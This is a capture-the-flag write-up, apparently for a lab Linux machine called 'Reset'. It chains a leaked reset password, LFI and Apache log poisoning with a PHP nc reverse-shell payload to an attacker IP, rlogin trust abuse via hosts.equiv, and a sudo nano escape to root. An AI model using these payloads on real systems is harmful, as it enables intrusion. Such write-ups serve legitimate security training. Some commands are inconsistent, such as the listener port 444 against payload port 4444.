                                                                  RESET

<img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/3e4c78c4-45df-4e3a-bb36-b28a349b12db" />

Difficulty: Easy<br>
Machine: Linux<br>
Write-Up made by Butlipan

Let’s start our journey by performing enumeration with nmap scan.
```
sudo nmap -sC -sV -A 10.129.234.130 -p-
```
![643788](https://github.com/user-attachments/assets/b2916b15-4cd8-4aa6-a3d7-e011a03b8542)

We found:<br>
Open SSH on port 22 -> Nothing interesting for now without creds. or identity file  
HTTP on port 80 -> Apache with admin panel, potential attack vector<br>
Rservices on ports 512,513 and 514 -> Rlogin, rsh, rexec<br>

For now, let’s visit a site on port 80

<img width="729" height="447" alt="Screenshot 2026-01-06 at 20-34-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/39e2e9e2-9660-463b-a75f-e2c67140b243" />

We are presented with admin panel. On first sight there nothing
interesting there. I din’t find any hardcoded cred. in page source,
also there wasn’t any suggestion which web app we are facing
right now. I tried some basic username+passwords combos like
admin – admin etc. And it also didn’t work. So we’ll try to use
forgot password to find hopefully a existing user.

<img width="736" height="127" alt="Screenshot 2026-01-06 at 20-42-08 Document 1-4 pdf" src="https://github.com/user-attachments/assets/b9d2cf49-f6c2-4120-9e7f-a049d741ef9f" />

Bingo! We found that admin is existing user. Now, we have two options:<br>
1 -> Use BurpSuite to find nuance in site respond<br>
2 -> Brute force with hydra<br>

First we gonna check option 1. Burpsuite time!

![uPKrp-jB](https://github.com/user-attachments/assets/37483502-e7c0-4bd9-85a8-ca79431c30ca)
        
As you see, option 2 now is invalid, we got a jackpot! In respond from the server we got a valid password for admin. Let’s verify that.

<img width="744" height="158" alt="Screenshot 2026-01-06 at 20-46-52 Document 1-4 pdf" src="https://github.com/user-attachments/assets/22567517-1574-43b9-91b4-617c3127eee1" />

We’re in! We can see admin dashboard with option to see logs:<br>
-> Syslog<br>
-> Auth.log<br>
But they are empty...

Let’s dig more!

![97696](https://github.com/user-attachments/assets/043f9fd4-3c78-415f-bff6-f44209425d72)

In request, we can spot this line: 
```
file=%2Fvar%2Flog%2Fauth.log
```
It can give us LFI if we find a weak spot. We can check this theory
by reading apache log

<img width="745" height="166" alt="Screenshot 2026-01-06 at 20-50-54 Document 1-4 pdf" src="https://github.com/user-attachments/assets/17fefe6e-64ba-4a83-ad98-4e7bcd83104d" />

I found where the log is stored. We can try using this information
for our advantage.

![6547848](https://github.com/user-attachments/assets/fde749f6-d4ba-4216-ae1f-13ab12d057ac)

Nice, it seems like this log is saving our agent. What it means? We can do log poisoning and receive reverse shell. 

![Bez nazwy jpgyreye](https://github.com/user-attachments/assets/3832470a-4b14-4773-9a97-2304d3dd0568)

I’ll use this and modify it for web purposes. The final payload is:<br>
```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.204 4444 >/tmp/f'); ?>
```
Now, setup listener
```
nc -lvnp 444
```
<img width="435" height="89" alt="Screenshot 2026-01-06 at 21-01-14 Document 1-4 pdf" src="https://github.com/user-attachments/assets/948f66fb-3fc4-4ce5-afe1-1e2f5945a01c" />

Time to attack!<br>
-> First, send payload in User-Agent to poinos log.<br>

<img width="750" height="281" alt="Screenshot 2026-01-06 at 21-10-46 Document 1-4 pdf" src="https://github.com/user-attachments/assets/7173285c-bcd5-4b84-bd4e-feaf12107d02" />

-> Secondly, send our previous LFI payload

<img width="571" height="138" alt="Screenshot 2026-01-06 at 21-11-19 Document 1-4 pdf" src="https://github.com/user-attachments/assets/0a46736b-794b-4793-a981-703761859de2" />

-> Pwned!

<img width="744" height="252" alt="Screenshot 2026-01-06 at 21-11-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/158182d6-fd80-4dd0-b2b3-2fb661063a74" />

Now, let's get better shell<br>
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@reset:/var/www/html$ export TERM=xterm
```
We can now grab the first flag, the user.txt in /home/sadm
```
www-data@reset:/var/www/html$ cat /home/sadm
```
After spending some time for searching clues and occasions for lateral movement/priv. escalation I found ‘hosts.equiv’ in /etc. 
```
www-data@reset:/var/www/html$ cat /etc/hosts.equiv 
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#		    command access to your system .
- root
- local
+ sadm
```
This seems to be related to our previous nmap result. Maybe if we add the sadm user on our host, we'll be able to connect to the victim host. 
```
$ sudo apt install rsh-client
$ sudo adduser sadm
$ sudo su sadm
$ rlogin 10.129.234.130
sadm@reset:~$ whoami
sadm
```
We’re in! Time to find the way to escalte to root.  
After searching for a while i found opned tmux session on our host
We can check what tmux is hidding from us!

```
sadm@reset:~$ ps aux
<snip>
root         949  0.0  0.5 317960 12056 ?        Ssl  12:09   0:00 /usr/sbin/ModemManager
root         999  0.0  0.2   8568  4428 ?        Ss   12:09   0:02 /usr/sbin/inetd
root        1002  0.0  0.1   6896  2916 ?        Ss   12:09   0:00 /usr/sbin/cron -f -P
root        1017  0.0  0.0   6176  1076 tty1     Ss+  12:09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1064  0.0  0.4  15440  9332 ?        Ss   12:09   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
sadm        1150  0.0  0.1   8796  3948 ?        Ss   12:09   0:00 tmux new-session -d -s sadm_session
sadm        1157  0.0  0.2   8808  5560 pts/3    Ss   12:09   0:00 -bash
root        1192  0.0  0.9 204368 19508 ?        Ss   12:09   0:02 /usr/sbin/apache2 -k start
www-data    1221  0.0  0.8 205064 17460 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
www-data    1230  0.0  0.8 205072 17420 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
www-data    1231  0.0  0.8 205084 17400 ?        S    12:09   0:00 /usr/sbin/apache2 -k start
<snip>
sadm@reset:~$ tmux attach -t sadm_session
```
![754859](https://github.com/user-attachments/assets/6eab381a-e30f-4842-979f-5a6297445594)

It look like password to me! But, let‘s check our sudo first 

<img width="635" height="272" alt="Screenshot 2026-01-06 at 21-39-05 Document 1-4 pdf" src="https://github.com/user-attachments/assets/275e15e0-f41e-4e81-8d17-9aa59c8f588c" />

Jackpot! I think we can now use firewall.sh to change our user to root. We’ll use nano to escalate our privileges.I’m gonna check GTFOBins to know how to do that properly
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
We got root! Now, just claim your flag and enjoy your win 😊
```
rootelp                                           M-F New Buffer                                    ^S Spell Check                                    ^J Full Justify                                   ^V Cut Till End
# .                                               M-\ Pipe Text                                     ^Y Linter                                         ^O Formatter                                      ^Z Suspend
# .
# .
# .
# .
# .
# .
# .
# .
# .
# .whoami
sh: 12: .whoami: not found
# whoami
root
# cat /root/root.txt
cat: /root/root.txt: No such file or directory
# cd /root
# ls -la
total 56
drwx------  8 root root 4096 Jun  2  2025 .
drwxr-xr-x 19 root root 4096 Jun  4  2025 ..
lrwxrwxrwx  1 root root    9 Dec  6  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jun  2  2025 .cache
drwx------  3 root root 4096 Dec  6  2024 .config
-rw-------  1 root root   20 Jun  2  2025 .lesshst
drwxr-xr-x  3 root root 4096 Dec  6  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Apr 10  2025 root_279e22f8.txt
drwxrwxr-x  2 root root 4096 Jun  2  2025 .scripts
-rw-r--r--  1 root root   66 Dec  6  2024 .selected_editor
drwx------  3 root root 4096 Dec  6  2024 snap
drwx------  2 root root 4096 Dec  6  2024 .ssh
-rw-r--r--  1 root root    0 Feb  7  2025 .sudo_as_admin_successful
-rw-r--r--  1 root root  165 Jun  2  2025 .wget-hsts
# cat root_279e22f8.txt  
7ad...
```



 



